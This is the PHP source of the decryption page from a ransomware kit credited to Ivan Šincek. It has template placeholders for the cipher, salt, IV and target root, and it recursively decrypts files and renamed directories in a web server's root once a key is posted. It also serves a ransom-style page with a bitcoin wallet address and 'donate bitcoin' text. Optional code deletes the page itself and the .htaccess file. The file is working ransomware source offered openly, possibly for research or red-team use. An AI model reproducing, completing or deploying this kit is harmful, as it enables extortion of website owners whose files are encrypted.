<?php
@error_reporting(0);
@set_time_limit(0);
@umask(0);
class Ransomware {
    private $root = '<root/>';
    private $salt = null;
    private $cryptoKey = null;
    private $cryptoKeyLength = '<cryptoKeyLength/>';
    private $iterations = '<iterations/>';
    private $algorithm = '<algorithm/>';
    private $iv = null;
    private $cipher = '<cipher/>';
    private $extension = '<extension/>';
    public function __construct($key) {
        $this->salt = base64_decode('<salt/>');
        $this->cryptoKey = @openssl_pbkdf2($key, $this->salt, $this->cryptoKeyLength, $this->iterations, $this->algorithm);
        $this->iv = base64_decode('<iv/>');
    }
    private function deleteDecryptionFile($directory) {
        unlink($directory . '/.htaccess');
        unlink($_SERVER['SCRIPT_FILENAME']);
    }
    private function decryptName($path) {
        $decryptedName = @openssl_decrypt(urldecode(pathinfo($path, PATHINFO_FILENAME)), $this->cipher, $this->cryptoKey, 0, $this->iv);
        $decryptedName = $decryptedName ? substr($path, 0, strripos($path, '/') + 1) . $decryptedName : false;
        return $decryptedName;
    }
    private function decryptDirectory($encryptedDirectory) {
        if (pathinfo($encryptedDirectory, PATHINFO_EXTENSION) === $this->extension) {
            $directory = $this->decryptName($encryptedDirectory);
            if ($directory !== false) {
                rename($encryptedDirectory, $directory);
            }
        }
    }
    private function decryptFile($encryptedFile) {
        if (pathinfo($encryptedFile, PATHINFO_EXTENSION) === $this->extension) {
            $data = @openssl_decrypt(file_get_contents($encryptedFile), $this->cipher, $this->cryptoKey, 0, $this->iv);
            if ($data !== false) {
                $file = $this->decryptName($encryptedFile);
                if ($file !== false && rename($encryptedFile, $file)) {
                    if (!file_put_contents($file, $data, LOCK_EX)) {
                        rename($file, $encryptedFile);
                    }
                }
            }
        }
    }
    private function scan($directory) {
        $files = @array_diff(scandir($directory), array('.', '..'));
        if ($files !== false) {
            foreach ($files as $file) {
                $path = $directory . '/' . $file;
                if (is_dir($path)) {
                    $this->scan($path);
                    $this->decryptDirectory($path);
                } else {
                    $this->decryptFile($path);
                }
            }
        }
    }
    public function run() {
        // $this->deleteDecryptionFile($this->root);
        if ($this->cryptoKey !== false) {
            $this->scan($this->root);
        }
    }
}
$errorMessage = '';
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post' && isset($_POST['key'])) {
    mb_internal_encoding('UTF-8');
    if (mb_strlen($_POST['key']) < 1) {
        $errorMessage = 'Please enter decryption key';
    } else if (!extension_loaded('openssl')) {
        $errorMessage = 'OpenSSL not enabled';
    } else {
        $ransomware = new Ransomware($_POST['key']);
        $ransomware->run();
        unset($_POST['key'], $ransomware);
        @gc_collect_cycles();
        header('Location: /');
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Ransomware</title>
		<meta name="description" content="Ransomware written in PHP.">
		<meta name="keywords" content="HTML, CSS, PHP, ransomware">
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<style>
			html {
				height: 100%;
			}
			body {
				background-color: #262626;
				display: flex;
				flex-direction: column;
				margin: 0;
				height: inherit;
				color: #F8F8F8;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				font-weight: 400;
				text-align: left;
			}
			.front-form {
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				flex: 1 0 auto;
				padding: 0.5em;
			}
			.front-form .layout {
				background-color: #DCDCDC;
				padding: 1.5em;
				width: 21em;
				color: #000;
				border: 0.07em solid #000;
			}
			.front-form .layout header {
				text-align: center;
			}
			.front-form .layout header .title {
				margin: 0;
				font-size: 2.6em;
				font-weight: 400;
			}
			.front-form .layout .about {
				text-align: center;
			}
			.front-form .layout .about p {
				margin: 1em 0;
				color: #2F4F4F;
				font-weight: 600;
				word-wrap: break-word;
			}
			.front-form .layout .about img {
				border: 0.07em solid #000;
			}
			.front-form .layout form {
				display: flex;
				flex-direction: column;
				margin-top: 1em;
			}
			.front-form .layout form input {
				-webkit-appearance: none;
				-moz-appearance: none;
				appearance: none;
				margin: 0;
				padding: 0.2em 0.4em;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				border: 0.07em solid #9D2A00;
				-webkit-border-radius: 0;
				-moz-border-radius: 0;
				border-radius: 0;
			}
			.front-form .layout form input[type="submit"] {
				background-color: #FF4500;
				color: #F8F8F8;
				cursor: pointer;
				transition: background-color 220ms linear;
			}
			.front-form .layout form input[type="submit"]:hover {
				background-color: #D83A00;
				transition: background-color 220ms linear;
			}
			.front-form .layout form .error {
				margin: 0 0 1em 0;
				color: #9D2A00;
				font-size: 0.8em;
			}
			.front-form .layout form .error:not(:empty) {
				margin: 0.2em 0 1em 0;
			}
			.front-form .layout form label {
				margin-bottom: 0.2em;
				height: 1.2em;
			}
			@media screen and (max-width: 480px) {
				.front-form .layout {
					width: 15.5em;
				}
			}
			@media screen and (max-width: 320px) {
				.front-form .layout {
					width: 14.5em;
				}
				.front-form .layout header .title {
					font-size: 2.4em;
				}
				.front-form .layout .about p {
					font-size: 0.9em;
				}
			}
		</style>
	</head>
	<body>
		<div class="front-form">
			<div class="layout">
				<header>
					<h1 class="title">Ransomware</h1>
				</header>
				<div class="about">
					<p>Made by Ivan Šincek.</p>
					<p>I hope you like it!</p>
					<p>Feel free to donate bitcoin.</p>
					<img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAACWCAIAAACzY+a1AAAABmJLR0QA/wD/AP+gvaeTAAADYklEQVR4nO2dy27jMAwAnUX//5fTwxY5CI4ghaTkcWYuC2z8agdEWImkH8/n8xAy/3Y/gET5+f/P4/FYc7+poG+eqjl32ad9IudGeN3XKMSjQjwqxKNCPD+n/5v4l0b/672fVvSpy4wiN0o8t+HdQxqFeFSIR4V4VIjnPJ1piKxWRA7uf9rPUCKP0Vw5Mdmp+E0ahXhUiEeFeFSIZyidqSPx630q6YhkKMu2kwYxCvGoEI8K8agQz+Z0ZqqkpX9uA6L+JQWjEI8K8agQjwrxDKUzdUX7U4nD1JJKYoaS+ONX/CaNQjwqxKNCPCrEc57O7FqeSOw/Suxdmrpy/+AKjEI8KsSjQjwqxPO41LiEulKayK7WxTEK8agQjwrxqBBP/tyZul2exOWYXWNoEj99YRTiUSEeFeJRIZ6h1Zllncq7BuVF+p7qJtoMnmsU4lEhHhXiUSGeT0qBp1ZJ6lhWSjPVYJVYWePcmW9BhXhUiEeFeIY2mxIn4y2rjpm6b+IYvcQRwm42fQsqxKNCPCrE85fO1DX+JJ6buKu1a88rcqN3GIV4VIhHhXhUiOevdmZBicfIwVP33fUYdS3gn93XKMSjQjwqxKNCPOfpzLIv8GXD7q7Zt23tjByHCm+ACvGoEE/5GL26upvImlHdDlHiwYMYhXhUiEeFeFSIZ6h2JrJaUbcH1L9RZKOqLquqqJM2CvGoEI8K8agQz3lnE2IPaNfsuwgVVzYK8agQjwrxqBBPQu1Me8WC/ZQ4dT9g4tKVm01figrxqBCPCvEMjdFrmPoSvsg43sRP63K9qYPdbLoPKsSjQjwqxJM/FbhhWdPQsr2nqcdIvJFj9G6LCvGoEI8K8Wx+o3Zd/3Ti/tGy4X5TuDpzH1SIR4V4VIgn/43afRK7qxOvvKvByqnAchwqvAEqxKNCPOebTXW9PP0bJc4M3jXrr+6dTe8ONgrxqBCPCvGoEM9Q7cyyNxMk1tE21DUr7Xq/1QujEI8K8agQjwrxfNLZVEekpaghcUll2VvAP8tujEI8KsSjQjwqxHOtdKYhkt0s2xJqqKtCsrPptqgQjwrxqBDPJ43ay6ir7o0U7PZZ3yBuFOJRIR4V4lEhnvJXUC5j17CY/qUWLCEZhXhUiEeFeFSIZ/PcGYljFOJRIZ5fegtTUAXpVhUAAAAASUVORK5CYII=" alt="Bitcoin Wallet">
					<p>1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14</p>
				</div>
				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
					<label for="key">Decryption Key</label>
					<input name="key" id="key" type="text" spellcheck="false" autofocus="autofocus">
					<p class="error"><?php echo $errorMessage; ?></p>
					<input type="submit" value="Decrypt">
					<input type="hidden" value="<recovery/>" placeholder="b64-recovery">
				</form>
			</div>
		</div>
	</body>
</html>
